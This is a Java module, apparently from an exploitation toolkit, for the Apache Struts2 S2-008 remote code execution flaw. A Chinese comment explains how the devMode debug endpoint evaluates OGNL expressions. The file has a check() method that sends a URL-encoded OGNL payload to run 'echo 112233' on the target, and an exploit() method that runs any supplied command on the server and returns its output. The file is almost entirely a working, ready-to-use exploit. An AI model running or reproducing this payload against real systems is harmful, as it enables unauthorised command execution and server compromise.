package Module;

import Framework.HTTPinterface;

/**
 * S2-008 远程代码执行漏洞
 * 影响版本: 2.1.0 - 2.3.1
 * 漏洞详情: http://struts.apache.org/docs/s2-008.html
 *
 * 原理
 * 参考 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
 * S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，
 * 一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，
 * 正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。
 * 例如在 devMode 模式下直接添加参数?debug=command&expression=<OGNL EXP>，会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）
 */

public class S2_008_RCE {
    public static Boolean check(String url){
        try {
            String result = HTTPinterface.GET(url +
                    "?debug=command&expression=(%23context%5B%22xwork.MethodAccessor." +
                    "denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass()." +
                    "getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)" +
                    "%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java." +
                    "lang.Runtime%40getRuntime().exec(%22echo+112233%22).getInputStream()%2C%23b%3Dnew%20java." +
                    "io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)" +
                    "%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context." +
                    "get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)." +
                    "getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close())");
            if(result.contains("112233")){
                return true;
            }else{
                return false;
            }
        }catch (Exception e) {
            return false;
        }
    }

    public static String exploit(String url,String cmd){
        try{
            cmd=cmd.replace(" ","+");
            String result = HTTPinterface.GET(url +
                    "?debug=command&expression=(%23context%5B%22xwork.MethodAccessor." +
                    "denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass()." +
                    "getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)" +
                    "%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java." +
                    "lang.Runtime%40getRuntime().exec(%22"+cmd+"%22).getInputStream()%2C%23b%3Dnew%20java." +
                    "io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)" +
                    "%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context." +
                    "get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)." +
                    "getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close())");
            return result;
        }catch (Exception e){
            return "[-]访问出错";
        }
    }
}
